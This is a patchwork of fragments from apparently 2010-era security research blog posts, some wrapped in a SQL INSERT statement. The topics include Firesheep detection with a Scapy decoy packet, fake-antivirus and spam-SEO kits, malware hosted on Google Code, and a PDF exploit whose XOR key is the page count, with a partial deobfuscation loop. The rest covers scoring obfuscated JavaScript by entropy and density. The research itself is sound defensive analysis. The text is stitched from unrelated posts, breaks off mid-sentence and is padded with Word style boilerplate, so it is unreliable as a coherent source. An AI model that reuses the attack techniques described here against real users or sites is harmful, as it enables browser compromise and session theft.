reuses the same network listening back-end and the list of sites and corresponding cookies, etc. This ensures that the fake traffic generated by BlackSheep is what Firesheep is expecting.    BlackSheep in action    First, install BlackSheep here. If you already have FireSheep installed, make sure it is disabled, otherwise BlackSheep will detect that you are using FireSheep.    Then select the correct network interface in the options menu (same as FireSheep).           	  		  			  		  		  			BlackSheep preferences menu  		  	        By default, BlackSheep generates fake traffic every 5 minutes. You can change this value in the option settings.    If Firesheep is detected, you will see the following warning in your current browser tab.                	  		  			  		  		  			BlackSheep notification  		  	             Finally, here is a video of BlackSheep in action.                   Surf safe!    Requirements    In order to install BlackSheep, you need:      	Mac OS X: 10.5 or newer on an Intel processor.  	Windows: XP or newer. Install Winpcap first!

When the hosting providers started to shutdown these sites, the attackers pretty much deserted the TLD. The malicious pages are now spread amongst various TLDs: .NET (securityptenea.net, true-protection35.net, etc.), .IN (saveaybeve.in, lastyourholder.in, smart-filechecker.in, etc.), back in .co.cc (photolocations.co.cc, zyvsmywn.co.cc, etc.),  .cz.cc (4mut.cz.cc, 4fsb.cz.cc, etc.), IP addresses (195.54.171.13, 77.78.203.144, etc.), etc.    These sites seem to be shutdown at a steady pace, but new ones re-appear just as quickly. .IN domains are the most common in recent days.    HTML encoding    After starting to insert random white space in HTML code, fake AV pages now use HTML entities to encode HTML in random places. These simple techniques can defeat basic string-based signature detection.         	  		  			  		  		  			HTML encoding (Securty Analysis) and white spaces in the source code  		  	      JavaScript obfuscation    It used to be quite rare to find obfuscated JavaScript in fake AV pages. Not anymore. But surprisingly, the attackers have chosen not to encode the CSS included in the same file, which makes it very easy to detect these pages.                	  		  			  		  		  			Obfuscated JavaScript  		  	        JavaScript redirections    Another technique now widely used to evade security tools is to include an additional HTTP redirection by using one JavaScript statement: document.location=NEW_URL, window.location=NEW_URL or location.assign(NEW_URL).                          	  		  			  		  		  			JavaScript redirection toe actual malicious page on the same domain.

To my surprise, this tool received a large amount of media attention. As the authors point out in their presentation, session hijacking is nothing new ... they actually describe it as the known \"elephant in the room.\" In fact a few years ago (2008), sidejacking was presented at DefCon and a tool was written to take advantage of Gmail cookies being passed over HTTP to hijack Gmail sessions (see preso here). This presentation and tool also received a fair bit of media attention. Unfortunately not a whole lot was done about this problem. Google did eventually provided persistent SSL/TLS sessions for Gmail users, however as the Google Handler in Firesheep shows, user\'s Google session cookies can be captured when navigating from Gmail (HTTPS) to the Google search page (HTTP) or other HTTP Google pages that continue to track your Google profile (session). As the list of Firesheep handlers shows, the problem of passing session cookies in the clear is persistent across most all mainstream web services:      So how do you the user deal with this problem of websites passing session cookies in the clear for all to snoop off the Starbucks or Panera wifi you\'re using. The proper way of dealing with this problem is to browse to these sites through a trusted network connection. If not available, an encrypted tunnel (VPN, SSH, SSL, etc.) may be established through a trusted host to secure your web transactions. In addition to these known good security practices, I also took a look at detecting if someone is running Firesheep on the LAN/WLAN that you are connected to. The first thing that Firesheep does after it detects the session cookies for a site of interest is to automatically attempt to connect and scrape the user\'s account name and avatar to then display in the Firesheep/Firefox side panel. Because Firesheep is running on the same LAN/WLAN you are able to see Firesheep\'s network transactions the same way it saw yours :)    I just used Scapy (a python packet manipulation program) and generated one packet with the Facebook details that Firesheep is looking for. Here is the Facebook Firesheep handler:    Firesheep is looking for 3 cookies (xs, c_user, and sid) being passed to Facebook. So that\'s what I generate, with a few modifications - I make my packet IP address destination just for the gateway IP (versus sending garbage to Facebook) and send bogus \"66666\" values for the three cookies. In the Scapy interactive session this was done in these three lines (for readability):                >>> get = \"GET /home.php HTTP/1.1\\r\\nHost: www.facebook.com\\r\\nUser-Agent:  Mozilla/5.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*  /*;q=0.8\\r\\nAccept-Language: en-us,en;q=0.5\\r\\nAccept-Encoding: gzip,deflate\\r\\nAccept-  Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\nKeep-Alive: 115\\r\\nConnection: keep-alive\\r  \\nCookie: c_user=66666; sid=66; xs=6666666\\r\\n\\r\\n\"  >>> pkt = IP(dst=\"192.168.1.1\")/TCP(flags=\"SPA\",sport=12345,dport=80)/get  >>> send(pkt)      Here is the output of the packet that was generated:      Immediately after putting this packet onto the wire (well actually, it was wifi), I was able to see in Wireshark an attempted network session to Facebook with the fake session cookies that I populated.  The first packet highlighted in blue is the generated / fake Facebook session cookie packet to 192.168.1.1. Immediately following this packet being sent, we see packets being generated from my open Firefox running a Firesheep capture on the network. Firesheep immediately attempts to access www.facebook.com/home.php with the captured (fake) session cookies, only to be 302 redirected to the login.php page since the session is invalid. Any users running Firesheep on this LAN/WLAN would have also attempted this invalid session information and we would have seen it in our packet capture. From the Firesheep user\'s perspective, an error is displayed for the fake session information that I provided. Whereas, valid sessions display the account name and avatar that was scraped from accessing Facebook with the captured session cookies:    This technique could be put in a loop to generate and flood random fake session packets to provide an annoyance to the Firesheep user. Though they would just have to scroll through and ignore all of the error profiles. Also the flood of fake session packets and corresponding flood of traffic from Firesheep attempting to connect with the session cookies would likely result in a fairly unusable wifi network - and possible blacklisting from Facebook or other sites being repeatedly accessed by Firesheep with false session cookies.    The above described technique provides a 1 packet means of detecting Firesheep. Regardless of detection, users should (1) be wary of authenticating to sites on public/untrusted networks, (2) be disappointed with and encourage security changes among the web services they use, and (3) utilize encrypted tunnels (VPN, SSH, SSL proxy, etc.) to protect their session information when on public networks.

If someone visits this webpage, he/she will only see text labeled “Loading….”. Meanwhile, the malicious code is downloading the various JAR files and may additionally download other malicious files. An interesting fact about this code comes from the random text inside the ‘div’ tag. Initially, the purpose of the random text was unclear. I later identified another example of code using exactly the same ‘div’ tag. At that point I assumed that it wasn’t entirely random afterall. Let’s open the source code of the “js.php” file and take a look:            The above code has been manually formatted for the purpose of this blog. Looking at the above code, it is clear that eval() has been called on a function named decodeBase64() HTML parameters passed to the function. The ‘document.getElementById(‘page’).innerHTML’ function gets the text that occurs between that element\'s opening and closing tag. If we look at first image of actual exploit, you will find ‘div’ tag has ‘page’ as an ID. This means the random text inside the ‘div’ tag should be passed to this ‘eval()’ function to further decode it. Let’s do that by passing random text as parameter to the decodeBase64() function:                         Let’s pass this above script code to Malzilla for further decoding. It turns out that the decoded malicious code targets a few different vulnerabilities.

Some of these files are variations of the \"Hot Video\" pages, other are unrelated to the attack.    Here are some of the more interesting scripts I found.    PHP Shell    Using PHP or shell commands through HTTP requests might still be too much work for some people!

It might be used by spam sites to access the Google Hot Trends without being detected and blacklisted.

They are usually created by the same script which shows the \"Hot Video\" page (see Part III). But on a few sites, there is a separate sitemap.php file to create this list.    The script uses the list of keywords for key.txt, and the list of sites from sites.txt to generate a list of spam pages.                	  		  			  		  		  			PHP code of sitemap.php  		  	                            Script kiddies?

Fortunately, Steffan Esser wrote evalhook to make deobfuscation easier. His article about the tool describes how it works. Basically, it is a library used with PHP to render code that is executed by the eval() function.    There are no instructions for compiling the source code, so it took me a little bit of time to understand all the necessary steps to use the code on CentOS5. Here are basic instructions to compile the code.    First, you need:           	PHP >= v5.2  	php-devel  	PHP Zend Optimizer      CentOS5 comes with PHP 5.1, so you will need to obtain a newer version from another YUM repository.

Then, run these commands:                tar xvfz evalhook-0.1.tar.gz  cd evalhook  phpize   ./configure  make  sudo make install      Now, you can use the evahlhook library to deobfuscate PHP files, as described in the original article:                     $ php -d extension=evalhook.so encoded_script.php      The only inconvenience I had to deal with when using evalhook, was that the resulting code still has strings encoded with hexadecimal and octal.

One of the primary targets for Clickjacking has been Facebook and most notably their new \'Like\' feature which now appears on over 2 million websites.    Most of the \'Likejacking\' attacks as they\'re commonly called, actually occur on third party websites but leverage the \'Like\' button to promote advertising scams. Today however, we spotted a clickjacking attack directly on Facebook (within an IFRAME).    The scam appears within a Facebook page entitled \'This poor girl killed herself right after her dad posted this to her wall\', which was still live at the time of this blog posting. When viewed, a user is first presented with a warning message, which is must first be accepted in order to display third party content within the following IFRAME:       http://girlkilledherself.leadhoster.com/suicide38/iframe.php              This is the clickjacking attack. Using a little social engineering, the victim is led to believe that they need to click on the numbered buttons in a particular order assuming that it\'s some form of CAPTCHA, designed to ensure that a human being is involved in the process. In reality, when selecting buttons a victim is posting this page to their wall and \'liking\' the page. Both are efforts to further promote the scam. Users of NoScript will be protected as can be seen in the screenshots below as the plugin detects the fact that transparent images have been placed over the numbered buttons using the z-index property.         The overall purpose of the scam is fairly typical of clickjacking attacks that we\'ve seen to date. When a user follows through and clicks on the buttons, they will unintentionally promote the page within Facebook and then be redirected to scams that the attacker presumably receives click-thru revenue from. It\'s always amazing to me how lucrative these attacks can be. As can be seen in the screenshot of people that \'like\' the page, hundreds of people have already fallen victim and that number quickly grew as I wrote this post.    The sites ultimately being advertised range from software to car insurance.

Google started to crawl the spam pages on August 15th. Here is the breakdown of crawler access:Google: 29,402Yahoo!: 580MSN: 198% of the crawler access to this page was done by Google, so it is not surprising that Google search results contained more spam links than Yahoo! or Bing. Bing visited the spam page on September 6th, and Yahoo! for the first time on August 27th, 12 days after Google. This plays well with what I\'ve described before: Yahoo! is late to add spam pages to its search results, and Bing does not seem to contain any..news/This folder contains about 25,000 pages.Spam pagesThe file name is based on the popular searches. For each search, there is a -new.html file,  a -key.html file, and a .html file.The -new.html and -key.html pages look similar. The -new.html files contain links to the malicious \"Hot Video\" page on other domains, whereas -key.html files contain links to the fake pages on the same domain, for example news.php?page=tour+de+francecheck=f7b972cf78d306834a08b9655bff1822Links to \"Hot Video\" pagesThe 3rd file contains a spam page, the same type we\'ve seen for other blackhat spam SEO attacks.Spam pageThe content of these 3 files is combined to create the overall \"Hot Video\" spam page.news.dotThis is the template for the \"Hot Video\" spam page.There are 4 main sections in the template:the fake Youtube page, with the flash file load.swf to redirect users to the malicious site, player.gif for the picture of the fake Video player and style.css for the style sheeta list of links to \"Hot Video\" pages on other domainsa list of links to \"Hot Video\" pages on the same domainspam content for a specific searchHTML templatenews.phpThis PHP script is obfuscated with \"FOPO - Free Online PHP Obfuscator v1.2: http://www.fopo.com.ar\".Obfuscated PHP codeOnce de-obfuscated, the code is pretty simple.The script does two main actions:display the spam pagecreate spam contentDe-ofuscated code for news.phpThe script displays the same page to crawlers and regular users. If the script detects a crawler, it also logs information about the crawl in news.txt. The detection is based on the user agent only - if the string slurp is found, it is the Yahoo crawler, GoogleBot is detected by the string googlebot, and Bing is detected with msnbot.Requests to news.php are involve a query string which contains 2 parameters:the search terma hashThe search term is used to fill out the news.dot template with the corresponding spam content and links to other \"Hot Video\" pages. The hash is used to make sure the request is legitimate, and it is done against the search term and an internal key. This prevents researchers, for example, from accessing the page with random query strings.Surprisingly, there is some \"dead code\". Checks are done for the presence of a file, or the value of an HTTP request, but nothing is then done with it. If a new search term is used, and the corresponding files are not found in the news/ directory, the script generates it\'s own spam content. It does so by requesting the first 100 results of the search term from www.google.ru. It then uses the summary of each search result given by Google to build the page. Images are added to the page as well, but they come from a Bing image search for the given search terms. The links to other \"Hot Video\" pages is built from the files key.txt and sites.txt.The \"Hot Video\" page does not require any command and control server. It can generate new spam pages automatically.The redirection to the malicious site is ultimately done by another hijacked site, compuclick.de. Pages on this domain still redirect to fake AV pages, and they are not blocked by Google Safe browsing: www1.repulseguard10.co.cc, www1.repulseguard3.co.cc, etc.I will detail the other files in later blog posts.

We have now found yet another case where Google Code is being used to spread malware. According to Google Code site, “Project Hosting on Google Code provides a free collaborative development environment for open source projects. Each project comes with its own member controls, Subversion/Mercurial repository, issue tracker, wiki pages, and downloads section. Our project hosting service is simple, fast, reliable, and scalable, so that you can focus on your own open source development”. The malicious project in question has about 50+ executable stored in the download section of the project. Here is the screenshot of the malicious content:                       Most of the files are executable files along with zipped “.rar” files. The time stamps show that the files have been uploaded over the course of the last month. This suggests that an attacker is actively using this free service to spread malware. Virustotal results for the first file, show that only 8 antivirus vendors out of 43 flagged the file as malicious. The detection ratio for second file is slightly better than that of the first file.         Let’s analyze first file which is “xin.exe”. When the first file is executed on the system, it will make several GET requests to download additional malware onto the system. Here is the first GET request,                       A request for the “love.txt” file contains additional malware also stored on the Google Code site. Here is the link to an analysis of malware by Sunbelt security. The malware performs significant file, network and process activity to while infecting the system. Here is the packet capture of various requests to receive additional malware.                       Further analysis of all files shows that they are all malicious threats including Trojans horses, backdoors, password stealing Keyloggers for online games such as “World of Warcraft” etc. Analysis of the file resources from ThreatExpert report indicates the possible country of origin is China. Interestingly, Google Code FAQ page says they will take down the whole project if they find malware being hosted on the project.                       The question is how and when the Google Code team scans content hosted on their website to ensure that it’s not infected with malware? The first malicious file was uploaded on June 24, 2010, while this blog was written at the end of August – over a month has passed and still the malicious files are being hosted at the Google Code site. The attacker not only storing old malware but he is also actively uploading new malware on the site. The detection ration by AV vendors varies from reasonable to poor given the specific malware sample. As Google Code is free hosting website for developers, attackers are clearly taking advantage of the site to push their malware.         Have you hosted anything?         UPDATE: 2 September 2010    Google has immediately taken down the project and URL to that project is no longer accessible.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (495, 'PDF Exploit: Number Of Pages Is The Key', 'ThreatLabz', 'August 04, 2010', 'PDF exploits targeting a number of recent Adobe vulnerabilities exist in the wild. In the past, we have seen number of different obfuscation and decoding techniques being used by the exploits to avoid anti-virus detection. Increasingly, PDF exploits are becoming more and more sophisticated. Recently, we came across one PDF exploit which appeared to be targeting recent Adobe vulnerabilities, but it wasn’t clear which ones. Interestingly, the attacker had used a key to decode his malicious code. Here is the screenshot of malicious encoded JavaScript inside the one of the objects within the PDF file,    I decoded this suspicious object using the pdf-parser tool and found obfuscated JavaScript code inside. Here is what the decoded code looked like:    The code is heavily obfuscated to hide the actual exploit code. There were 2 calls to the “eval()” function. The first one extracted one variable (i.e. K9U8Zm8NS4) from another (i.e. KeNJ148) which is then XOR’ed with 2 other variables which are nothing but some secret key values. Confused? Hang tight. After that there is a call to a “String.fromCharCode” function on the final XOR’ed variable (i.e. e208xh). After initial analysis of the code, I pasted the code into Malzilla to see the final output of the obfuscated JavaScript code and found that Malzilla was unable to decode it. Something wasn’t going right for Malzilla.    I figured it out that there are some strings or function like “this.numPages” used inside the code and because of that, Malzilla was unable to decode it. If you observe, this is the first key (i.e. l46bQ8A) which is used to XOR with the original variable (i.e. e208xh). I changed the variable which was using the “this.numPages” function manually to integers such as 1, 2 etc. and tried decoding it once again. Finally, Malzilla started decoding it but the output was still not legible – I’d clearly missed some additional decoding routines. I then realized that there were 2 keys being used for XORing - one was hard coded with value “189” while the other was taking a value from the “this.numPages” function. This function returns the number of pages present inside the PDF file. That means whatever values I was passing to the variable manually, wasn’t correct and the script was unable to decode it. I re-opened the PDF file to search for object which contained the number of pages used inside the PDF and found the exact count,             There are “20” pages inside this malicious PDF file and this is turned out to be the first key which was used for XORing with the original variable. Now I changed the variable value to “20” and tried to decode the JavaScript. Finally, everything went according to plan and malzilla decoded the JavaScript into readable code. This was a rather unique trick used by the attacker to encode/decode the malicious JavaScript leveraging the “this.numPages” function. Once that challenge was solved, the rest was easy to understand as the skeleton of the final code was using a familiar heap spray technique and targeting known Adobe vulnerabilities. Here is the final decoded JavaScript:               The exploit was targeting 3 different vulnerabilities.    1) mediaNewplayer CVE-2009-4324    2) collectEmailInfo CVE-2007-5659    3) CollabgetIcon CVE-2009-0927    The detection for this PDF file remains very poor. Here is the Virustotal result for this file – currently, only 6 of 42 AV vendors detect it. This is a really interesting case as the “key” is actually a component of the PDF file and this is deliberately used by the attacker so that the manual decoding becomes difficult for researchers. Even Webpawet failed to decode it properly. This time attacker has used “number of pages” inside the PDF as a key to decode the malicious script code. I expect that we’ll see similar tricks going forward.    What’s your key?    Umesh', 'Exploit', 'https://www.zscaler.com/blogs/research/pdf-exploit-number-pages-key');

Normally, if a user clicks on a link within search engine results, the HTTP request to the external site contains a Referrer string from the search engine within the HTTP header. For example, if a user searches for \"this is a test\" in Google, any request to a search result will include the following Referrer:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nReferer: http://www.google.com?q=this+is+a+test&hl=en&safe=active\r\n\r\nFor these requests, the add-on changes the Referrer header to a different value. This means that the requested page does not know that a given request came from a Google, Yahoo or Bing search. This is critical as Blackhat SEO pages only deliver malicious content (fake AV, Flash/Java updates, codecs, etc.) when requests come from the SEO results. Changing the Referer header, breaks the attack.\r\n\r\nThe add-on does not change the referrer if you navigate within the same site (for example, inside google.com), or if your Referrer does not include a Bing, Yahoo or Google domain.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\nConfiguration\r\n\r\nYou can customize the behavior of the Search Engine Security add-on.

You can use an empty value, but it is recommended that you use a valid URL.\r\n\r\n- Modify User-Agent (NEW in 1.0.8)\r\n\r\nMost spam pages look at the Referrer value to decide whether or not to redirect users to a malicious page. However, in some cases like the Hot Video pages, only the User-Agent value is used. One common check is to look for \"slurp\" in the user-agent string to flag the request as coming form the Yahoo crawler. If you check the \"Modify User-Agent\" checkbox in the options, the string \"slurp\" is added to the User-Agent header when you leave Google/Bing/Yahoo in addition to overriding the Referrer header.\r\n\r\nThis option provides additional protection against malicious spam SEO.\r\n\r\n-Whitelist\r\n\r\nSome websites display a different page if you come from a search engine. When you use this add-on, the websites can no longer detect that you come from Google/Yahoo/Bing. If you are sure that a website is safe, you can add it to the whitelist.

The request size varied depending on the data parameter.  	The response size was always 24,778 bytes in the observed transactions.  	The user agent string varied among Microsoft Internet Explorer versions (to include MS IE 8).  	The transaction to the C&C was observed immediately following a transaction to MSN or WindowsUpdate.      The URL data parameter always began with “66a96e28” in the observed transactions – the remainder of the data string has been redacted to protect the victim information. The exact details of the data string is currently unknown, however it is likely to contain encoded details about the victim – such as Windows version, host name, account name, and possibly whether the Siemens WinCC or PCS7 software is running.

Secondly, sites leverage obfuscation in order to \'protect\' code by making it harder to understand and therefore copy. This latter motivation is of minimal value however as client side content can always be de-obfuscated given a basic level of effort. After all, the browser needs to interpret the code at some point.         JavaScript obfuscation presents a challenge for AV vendors. Despite what marketing literature would suggest, detecting malicious content still heavily relies on the use static signatures. Obfuscation is problematic as signatures cannot detect what they cannot see. This leaves two options. The AV engine can either first de-obfuscate the JavaScript or signatures can be created for obfuscated content. The latter is problematic as even a slight change in the content or encoding algorithm can lead to vastly different output, while de-obfuscation is an imperfect science as those who have used tools such as Malzilla can attest to.              I ran across an obfuscated JavaScript sample recently which illustrates this challenge. The code in question is perfectly legitimate and resides at About.com, a popular website which delivers information on a variety of topics. On a page entitled APR calculator, when looking at the page source, you will note a large block of obfuscated JavaScript within the section of the page.           <script language=\"javascript\">document.write(unescape(\'%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A...               At first glance, this appears to be a classic case of malicious content injected into an otherwise legitimate page. It\'s essentially a large block of hexadecimal encoded characters and it requires a couple of passes to fully decode everything. However, once de-obfuscation is complete, you uncover JavaScript code designed to calculate your mortgage payments...not attack your browser. For those interested in seeing the code in all it\'s glory, please follow the links below.         Obfuscated/De-obfuscated JavaScript files        	Obfuscated JavaScript  	First de-obfuscation pass  	Fully de-obfusctaed JavaScript      Despite the benign nature of this Javascript code, at the time this blog was published, no fewer than 18 of 41 antivirus engines flagged this code as malicious. What does this tell us about how the engines operate? Clearly they are inspecting the obfuscated code as opposed to the de-obfuscated code and flagging based on the existence of certain functions/data. The problem with this approach - while JavaScript obfuscation is used by the bad guys, it\'s used by the good guys as well. Identifying malicious content by statically inspecting obfuscated JavaScript is overly simplistic and as can be seen, is bound to trigger false positives.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/antivirus-struggling-obfuscated-javascript');

Well hidden exploits    Over the past 3 days, we\'ve seen some even more dangerous websites using Java exploits and Flash vulnerabilities. These malicious pages do not require any user interaction to infect users. They are also very difficult to detect - the exploits are hidden behind several layers of Javascript redirects and use obfuscation. Also, the attackers allow each IP address to receive the malicious page one time only. After a user or a security tool accesses the malicious domain, any subsequent requests coming from the same IP address get redirected to different, harmless pages. This makes post-infection analysis, and the use of security tools almost useless. You have to make sure that you hit the right page, the right way (correct headers, referer header, form data, etc.) the first time or the exploit will not be revealed.

These new pages are very similar to what we saw before. A malicious JAR file is launched automatically through a Java ActiveX control vulnerability on Internet Explorer, or through the Java Quick Starter, which is installed silently on Firefox with a recent Java Plugin update. The malicious JAR files are not flagged by most antivirus vendors.    Like all spam SEO, the attack starts with legitimate sites being hacked. New pages are added to target popular search terms, in order to appear in the first few pages of a Google search. When a user clicks on spam SEO links, he actually gets redirected to a different URL such as  hxxp://www.hutriken.com/nvu_y/hqpa_b_.php. This page checks to determine if the browser supports Java, and if so, sends the following form with automatically:                            Detection of Java capabilities      The next page (the 4th HTTP request) contains both inline obfuscated Javascript, and an external script (obfuscated as well).

The source code is stripped of white space, comments, etc., in order to make it more compact. Some minifiers can also rename internal variables to make them shorter. The minified Javascript is less readable for humans, but not to automation tools or security scanners. It is a common practice to serve minified Javascript either inline, as part of an HTML page, or in external sites, to reduce the loading time of pages. Google, Amazon, and most major websites use this technique.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\nfunction add(a,b){return a+b}\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nExample of minified Javascript\r\n\r\n\r\nPacker\r\n\r\nThen webmasters try to go further and additionally reduce code size by leveraging packers, such as using a base64 encoding. The source code is endoded in the new base, and decoded through Javascript in the browser. This results in a smaller code (if the original code is not too short) that is harder for humans to interpret and often harder for security tools to inspect.\r\n\r\nPacked Javascript is not widely used because the smaller file size is balanced by a longer execution time in the browser to decode the Javascript.\r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nExample of packed Javascript (line break inserted for readability)\r\n\r\n \r\n\r\nObfuscator\r\n\r\nObfuscation is done for the sole purpose of \"hiding\" the original code. Obfuscated code often results in a larger code size than that of unprocessed Javascript. The resulting code is unreadable by humans, and once again, complicates parsing for security scanners. A slight code change in the original code can also create a completely different set of obfuscated Javascript. That means an attacker can create many versions of the same original code and each will look very different from the others.\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nExample of lightly obfuscated Javascript\r\n\r\n\r\nObfuscated exploits\r\n\r\nThere are legitimate uses of obfuscated Javascript. For example, obfuscation can be used to hide e-mail addresses from web crawlers. Obfuscation is also commonly used by many advertising networks.\r\n\r\nBut Javascript obfuscation is widely used for malicious purposes. Attackers obfuscate their exploits to bypass security tools. They can also easily change the code on each site they infect, so that one detected malicious page does not result in all other exploited pages being detected.\r\n\r\nSometimes however, extreme obfuscation can make it easier to detect malicious code. When Javascript looks very different from minified, packed or even common obfuscation code patterns, they really stand out. It is sometimes easier to detect the obfuscation itself rather than the underlying exploit.\r\n\r\nMetasploit is a popular and powerful exploitation framework, which includes a number of browser exploits. It goes to great lengths to obfuscate the exploits: most variables are generated randomly for each run and the Javascript code is heavily obfuscated overall. As a result, Metasploit generated HTML code can really stand out:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	the code density is unusual: they have very long variable names, spaces at the beginning of lines, several line breaks in a row, etc.\r\n	repeatable patterns\r\n	\r\n		most ActiveX objects are called with new ActiveXObject(String.fromCharCode(\r\n		reassignment of the unescape Javascript function to a variable: <...> = unescape;\r\n		the decoding loop uses some unusual pieces of code: .toString(16); unescape(unescape(, etc.\r\n	\r\n	\r\n\r\n\r\nas a result, it can actually become easier to detect the exploits coming from Metasploit. We\'ve seen other examples where the attacker goes a little too far to obfuscate his code, and actually make it easier to recognize.\r\n\r\nObfuscation done right can make it harder to detect and understand exploits.

In order to evade detection, the kits frequently contain logic to obfuscate, or hide, the meaning behind the content that they serve to the victim.  Additionally, with each visit to the exploit page, the obfuscation techniques will differ slightly so that static, content signatures will be unable to detect the threat.  Other threats contain obfuscated JavaScript (JS) which sets up the page to exploit a vulnerability and launch a payload (for example, \"spraying\" the heap with shellcode).  Still other threats inject obfuscated JS into legitimate sites, which after decoding embeds a hidden (0-pixel) IFrame to malicious content.  As we have seen in the past, the JS encodings vary greatly with each incident, and many instances are encoded multiple times and may contain non-standard JS (reference past blog posts, such as \"More and more obfuscation being used in the malicious scripts\").  While some signatures have been written for things like generic heap spraying and other maliciousness within obfuscated JS, the bad guys are constantly updating their tactics to evade detection.  Anyway, the point that I\'m getting at is that scalable (think ISP), inline deobfuscation of JS is something that is *very* difficult to implement.One way of coping with this problem is to implement a number of efficient checks to analyze and score the JS inline for likelihood of maliciousness (JS heuristic).  Pages that meet a certain score threshold may have additional inspections done or the page may be blocked outright.  After doing some research and testing against some malicious and benign sites, I came up with a small number of checks that can be implemented inline and also produced some compelling results.  While I won\'t divulge all of the \"secret sauce\", I wanted to share two pretty interesting checks that I\'m doing against JS.Shannon Entropy ScoringEntropy is the \"measure of how organized or disorganized a system is\" (wikipedia) - in other words, it is the amount of randomness in something.  Shannon entropy is expressed in terms of probabilities, which describes the the number of yes/no questions (bits) needed to determine the content of a message (the more entropy in a message, the more questions required).Shannon entropy is expressed as:Where p(xi) is the probability of the xi sequence being in the message contents.After analyzing a number of benign versus malicious websites, I found that the vast majority of benign sites had an entropy score between 5 and 6.

There was a larger diversity of entropy scoring, but what I noticed were a lot of results that scored outside of the 5-6 range that was popular for the benign sites.

The benign websites generally contained English content.  The English alphabet has more entropy (upper/lower 26 letters, numbers, punctuation) than content that is made up of mostly Hex or encoded bytes (e.g., 0-9A-F).  This is visible within the hao123.com exploit page, that has a very low entropy score.  Some exploit kits used a larger and \"more random\" pool of characters in their encodings, variable names, etc. - these sites resulted in higher entropy scores.JavaScript \"Density\" ScoringExploit kits and exploit pages frequently store large blocks of encoded content into variables that are then processed by the script to result in the exploit, shellcode, redirect, or other content.  These large blocks of content make the JS for these pages more \"dense\" than JS found in typical websites.  By calculating the average character sequence size I am able to apply a numerical \"density\" score to the script content.  There is one problem with just separating character sequences by whitespace- a lot of JS has whitespace removed to save bandwidth (this is called JS minification), thus I also separate character sequences by a handful of JS characters, such as =;(){}.Applying density scoring on the same malicious versus benign sites above resulted in the benign sites having an average density score of 13.6808922 while the malicious sites had an average of 42.3847881.  Needless to say, there was a large disparity in the JS density between the malicious and benign sites that I tested.ConclusionsDeobfuscating all JS within webpages as they fly across the wire is not very scalable.  However, some techniques can be used to identify risky, or potentially malicious, obfuscated JS in realtime.  This provides a smaller subset of JS to further analyze inline or block based upon thresholding.  Preliminary results of some techniques, such as entropy and density scoring have produced some promising results.  By releasing these results to the community, I hope to encourage others to conduct analysis and share their work/results for scalable solutions for inline JS analysis besides simple signatures.  Below are some screenshots of an internal proof-of-concept that I built using the previously mentioned checks.Exploit site example:Benign site example:', 'Analysis;Exploit Kit', 'https://www.zscaler.com/blogs/research/inline-detection-evil-javascript');

Below are the screenshots of the part 1 of the script: <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   There are plenty of random variables defined initially and then one array is defined as “var sYvxoe19wg=new Array(); “. Now for each variable, the characters are being XOR\'d with random numbers and then the variables are concatenated in the array defined earlier.    for (var aRjNtT8j=0;aRjNtT8j   {            iSOi16qif48Q1[aRjNtT8j]=iSOi16qif48Q1[aRjNtT8j]^25;   };   sYvxoe19wg=sYvxoe19wg.concat(iSOi16qif48Q1);  This means the array will complete after XOR’ing 21 variables and concatenating them in the array. This array should be passed to some function to parse this. Let’s open second part of the script,    <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	